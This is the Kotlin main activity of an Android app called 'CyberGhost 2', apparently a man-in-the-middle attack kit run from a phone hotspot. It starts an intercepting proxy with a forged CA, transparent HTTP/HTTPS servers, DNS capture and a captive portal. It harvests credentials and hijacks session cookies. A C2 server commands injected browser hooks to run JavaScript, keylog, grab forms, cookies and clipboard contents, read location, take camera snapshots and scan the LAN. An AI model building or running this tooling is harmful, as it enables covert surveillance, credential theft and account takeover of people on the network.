package com.cyberghost

import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.util.Log
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.runtime.*
import androidx.core.app.NotificationCompat
import androidx.core.content.FileProvider
import com.cyberghost.core.*
import com.cyberghost.ui.*
import kotlinx.coroutines.launch
import java.io.File

class MainActivity : ComponentActivity() {

    private var certManager: CertManager? = null
    private var contentInjector: ContentInjector? = null
    private var proxy: InterceptProxy? = null
    private var c2Server: WebSocketC2Server? = null
    private var mediaServer: MediaServer? = null
    private var dnsCapture: DnsCapture? = null
    private var transparentHttp: TransparentHttpServer? = null
    private var transparentHttps: TransparentHttpsServer? = null
    private var captivePortal: CaptivePortal? = null
    private var pacServer: PacServer? = null
    private var hookJs: String = ""

    private lateinit var arpScanner: ArpScanner
    private val deviceManager = DeviceManager()
    private val trafficStats = TrafficStats()
    private val networkMapper = NetworkMapper()
    private val certViewer = SslCertViewer()
    private val sessionHijacker = SessionHijacker()
    private val wsCapture = WebSocketCapture()
    private val alertManager = AlertManager()
    private val portScanner = PortScanner()
    private val certInfoCache = mutableMapOf<String, CertInfo>()
    private lateinit var profileManager: ProfileManager
    private lateinit var packetExporter: PacketExporter
    private lateinit var sessionSave: SessionSave

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        arpScanner = ArpScanner(this)
        profileManager = ProfileManager(this)
        packetExporter = PacketExporter(this)
        sessionSave = SessionSave(this)
        createNotificationChannel()

        try { hookJs = assets.open("hook.js").bufferedReader().readText() }
        catch (e: Exception) { hookJs = "// hook.js load failed" }

        setContent {
            CyberGhostTheme {
                val gatewayIp = remember { HotspotManager.getHotspotIp(this@MainActivity) }
                val subnet = remember { HotspotManager.getSubnet(gatewayIp) }

                val packets = remember { mutableStateListOf<InterceptedPacket>() }
                val interceptQueue = remember { mutableStateListOf<PendingIntercept>() }
                val arpDevices by arpScanner.devices.collectAsState()
                val events = remember { mutableStateListOf<C2Event>() }
                val credentials = remember { mutableStateListOf<HarvestedCredential>() }
                val captiveEntries = remember { mutableStateListOf<CaptiveEntry>() }
                val wsFrames = remember { mutableStateListOf<WebSocketFrame>() }
                val hijackSessions by sessionHijacker.sessions.collectAsState()
                val networkHosts by networkMapper.hosts.collectAsState()
                val isScanning by networkMapper.scanning.collectAsState()
                val portScanResults by portScanner.results.collectAsState()
                var isRunning by remember { mutableStateOf(false) }
                var mode by remember { mutableStateOf(InterceptMode.PASSTHROUGH) }
                var config by remember { mutableStateOf(InjectionConfig()) }
                var captiveConfig by remember { mutableStateOf(CaptiveConfig()) }
                var hookedSessions by remember { mutableStateOf<List<HookedSession>>(emptyList()) }
                var profiles by remember { mutableStateOf(profileManager.list()) }
                var certInfos by remember { mutableStateOf<Map<String, CertInfo>>(emptyMap()) }
                var savedSessions by remember { mutableStateOf(sessionSave.list()) }
                var alertConfig by remember { mutableStateOf(alertManager.config) }
                val prefs = getSharedPreferences("cg2_prefs", Context.MODE_PRIVATE)
                var autoStart by remember { mutableStateOf(prefs.getBoolean("auto_start", false)) }

                // start ARP scanner immediately
                LaunchedEffect(Unit) { arpScanner.start(subnet) }

                LaunchedEffect(isRunning) {
                    if (isRunning) {
                        try {
                            if (certManager == null) certManager = CertManager(filesDir)
                            if (contentInjector == null) contentInjector = ContentInjector(mediaServerHost = gatewayIp)
                            contentInjector?.config = config

                            proxy = InterceptProxy(8080, certManager!!, contentInjector!!).also { p ->
                                p.mode = mode; p.start()
                                launch {
                                    p.packets.collect { pkt ->
                                        packets.add(pkt); if (packets.size > 2000) packets.removeAt(0)
                                        arpScanner.updateTraffic(pkt.sourceIp, pkt.headers["User-Agent"], pkt.body.size.toLong())
                                        trafficStats.recordPacket(pkt)
                                        if (pkt.isRequest) contentInjector?.harvester?.inspect(pkt)
                                    }
                                }
                                launch {
                                    contentInjector?.harvester?.credentials?.collect { cred ->
                                        credentials.add(cred)
                                        alertManager.alertCredential(cred)
                                        if (cred.type == CredentialType.COOKIE_SESSION) sessionHijacker.addFromCredential(cred)
                                    }
                                }
                            }

                            transparentHttp = TransparentHttpServer(80, proxy!!, contentInjector!!).also { it.start() }
                            transparentHttps = TransparentHttpsServer(443, proxy!!, certManager!!, contentInjector!!).also { it.start() }
                            mediaServer = MediaServer(9090, this@MainActivity, hookJs).also { it.start() }

                            c2Server = WebSocketC2Server(9091, deviceManager).also { c2 ->
                                c2.start()
                                launch {
                                    c2.events.collect { event ->
                                        events.add(event); if (events.size > 500) events.removeAt(0)
                                        if (event.type == "registered") {
                                            val ip = event.data["ip"] as? String ?: ""
                                            arpScanner.markHooked(ip, event.sessionId)
                                            val session = deviceManager.getSession(event.sessionId)
                                            session?.let { alertManager.alertHook(it, ip) }
                                        }
                                        if (event.type == "port_scan_result") {
                                            Log.i("CG2", "Browser port scan result: ${event.data}")
                                        }
                                    }
                                }
                            }

                            dnsCapture = DnsCapture(53, gatewayIp = gatewayIp, transparentMode = true).also { dns ->
                                dns.start()
                                launch { dns.queries.collect { trafficStats.recordDns() } }
                            }

                            pacServer = PacServer(8889, gatewayIp, 8080).also { it.start() }

                            captivePortal = CaptivePortal(8888).also { portal ->
                                portal.config = captiveConfig; portal.start()
                                launch { portal.entries.collect { captiveEntries.add(it) } }
                            }

                            launch {
                                while (true) {
                                    kotlinx.coroutines.delay(500)
                                    hookedSessions = deviceManager.getHookedSessions()
                                    updateNotification(arpDevices.size, hookedSessions.count { it.isAlive }, trafficStats.totalPackets.get(), credentials.size)
                                }
                            }

                            showNotification("Engines running on $gatewayIp")
                        } catch (e: Exception) {
                            Log.e("CG2", "Start failed", e); isRunning = false
                        }
                    } else {
                        stopAll(); cancelNotification()
                    }
                }

                LaunchedEffect(mode) { proxy?.mode = mode }
                LaunchedEffect(config) { contentInjector?.config = config }
                LaunchedEffect(captiveConfig) { captivePortal?.config = captiveConfig }
                LaunchedEffect(alertConfig) { alertManager.config = alertConfig }

                LaunchedEffect(isRunning) {
                    if (isRunning) {
                        launch {
                            while (true) {
                                kotlinx.coroutines.delay(200)
                                interceptQueue.clear()
                                interceptQueue.addAll(proxy?.interceptQueue?.toList() ?: emptyList())
                            }
                        }
                    }
                }

                // convert ArpDevice to ConnectedDevice
                val connectedDevices = remember(arpDevices) {
                    arpDevices.map { arp ->
                        ConnectedDevice(ip = arp.ip, mac = arp.mac, hostname = arp.nickname ?: arp.hostname,
                            userAgent = arp.userAgent, requestCount = arp.requestCount, bytesTransferred = arp.bytesTransferred).also { cd ->
                            deviceManager.getDevice(arp.ip)?.hookedSessions?.let { cd.hookedSessions.addAll(it) }
                        }
                    }
                }

                CyberGhostApp(
                    interceptQueue = interceptQueue, packets = packets, devices = connectedDevices,
                    hookedSessions = hookedSessions, mode = mode, isRunning = isRunning, events = events,
                    networkHosts = networkHosts, isScanning = isScanning, trafficStats = trafficStats,
                    profiles = profiles, certInfos = certInfos, credentials = credentials, currentConfig = config,
                    hijackSessions = hijackSessions, captiveEntries = captiveEntries, captiveConfig = captiveConfig,
                    wsFrames = wsFrames, savedSessions = savedSessions, autoStartEnabled = autoStart,
                    gatewayIp = gatewayIp, alertConfig = alertConfig, portScanResults = portScanResults,
                    onModeChange = { mode = it }, onToggle = { isRunning = !isRunning },
                    onForward = { id, pkt -> proxy?.forwardPacket(id, pkt) },
                    onDrop = { id -> proxy?.dropPacket(id) },
                    onCommand = { session, action, params ->
                        when (action) {
                            "exec_js" -> c2Server?.execJs(session, params["code"] as? String ?: "")
                            "screenshot" -> c2Server?.screenshot(session)
                            "keylog_start" -> c2Server?.startKeylog(session)
                            "keylog_stop" -> c2Server?.stopKeylog(session)
                            "get_cookies" -> c2Server?.getCookies(session)
                            "get_storage" -> c2Server?.getStorage(session)
                            "get_clipboard" -> c2Server?.getClipboard(session)
                            "get_location" -> c2Server?.getLocation(session)
                            "camera_snap" -> c2Server?.cameraSnap(session)
                            "form_grab" -> c2Server?.grabForms(session)
                            "get_dom" -> c2Server?.getDom(session)
                            "clipboard_monitor_start" -> c2Server?.sendCommand(session, "clipboard_monitor_start")
                            "form_intercept_start" -> c2Server?.sendCommand(session, "form_intercept_start")
                            "get_device_info" -> c2Server?.sendCommand(session, "get_device_info")
                            "port_scan" -> c2Server?.sendCommand(session, "port_scan", params)
                            "lan_probe" -> c2Server?.sendCommand(session, "lan_probe", params)
                            else -> c2Server?.sendCommand(session, action, params)
                        }
                    },
                    onExportCa = { exportCa() },
                    onExportHar = { packetExporter.exportHar(packets.toList())?.let { packetExporter.shareFile(it) } },
                    onConfigUpdate = { config = it },
                    onScanNetwork = { networkMapper.scan(subnet) },
                    onSaveProfile = { name -> profileManager.save(name, config); profiles = profileManager.list() },
                    onLoadProfile = { name -> profileManager.load(name)?.let { config = it } },
                    onDeleteProfile = { name -> profileManager.delete(name); profiles = profileManager.list() },
                    onSetNickname = { ip, name -> arpScanner.setNickname(ip, name) },
                    onInspectCert = { host ->
                        kotlinx.coroutines.MainScope().launch {
                            certViewer.inspect(host)?.let { certInfoCache[host] = it; certInfos = certInfoCache.toMap() }
                        }
                    },
                    onClearCredentials = { credentials.clear(); contentInjector?.harvester?.clear() },
                    onHijackSession = { session ->
                        try {
                            startActivity(Intent(Intent.ACTION_VIEW, Uri.parse("https://${session.host}")).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
                        } catch (e: Exception) { Log.e("CG2", "Hijack failed", e) }
                    },
                    onRemoveHijack = { id -> sessionHijacker.remove(id) },
                    onUpdateCaptiveConfig = { captiveConfig = it; captivePortal?.config = it },
                    onSaveSession = { sessionSave.save(packets.toList(), credentials.toList(), captiveEntries.toList()); savedSessions = sessionSave.list() },
                    onDeleteSession = { name -> sessionSave.delete(name); savedSessions = sessionSave.list() },
                    onShareSession = { name -> sessionSave.getFile(name)?.let { packetExporter.shareFile(it) } },
                    onToggleAutoStart = { enabled -> autoStart = enabled; prefs.edit().putBoolean("auto_start", enabled).apply() },
                    onUpdateAlertConfig = { alertConfig = it; alertManager.config = it },
                    onPortScan = { ip -> portScanner.scan(ip) }
                )
            }
        }
    }

    private fun exportCa() {
        try {
            val pem = certManager?.getCaCertPem() ?: return
            val file = File(cacheDir, "cyberghost_ca.crt"); file.writeText(pem)
            val uri = FileProvider.getUriForFile(this, "$packageName.fileprovider", file)
            startActivity(Intent.createChooser(Intent(Intent.ACTION_SEND).apply {
                type = "application/x-x509-ca-cert"; putExtra(Intent.EXTRA_STREAM, uri); addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
            }, "Export CyberGhost CA"))
        } catch (e: Exception) { Log.e("CG2", "CA export failed", e) }
    }

    private fun stopAll() {
        proxy?.stop(); proxy = null; transparentHttp?.stop(); transparentHttp = null
        transparentHttps?.stop(); transparentHttps = null; c2Server?.stop(); c2Server = null
        mediaServer?.stop(); mediaServer = null; dnsCapture?.stop(); dnsCapture = null
        captivePortal?.stop(); captivePortal = null
        pacServer?.stop(); pacServer = null
    }

    private fun createNotificationChannel() {
        val ch = NotificationChannel("cg2_status", "CyberGhost", NotificationManager.IMPORTANCE_LOW).apply { setShowBadge(false) }
        getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
    }

    private fun showNotification(text: String) {
        val n = NotificationCompat.Builder(this, "cg2_status").setContentTitle("CyberGhost 2").setContentText(text)
            .setSmallIcon(android.R.drawable.ic_menu_manage).setOngoing(true).build()
        getSystemService(NotificationManager::class.java).notify(1337, n)
    }

    private fun updateNotification(devices: Int, hooked: Int, packets: Long, creds: Int) {
        showNotification("D:$devices  H:$hooked  P:$packets  C:$creds")
    }

    private fun cancelNotification() {
        getSystemService(NotificationManager::class.java).cancel(1337)
    }

    override fun onDestroy() {
        arpScanner.stop(); stopAll(); alertManager.stop(); cancelNotification(); super.onDestroy()
    }
}
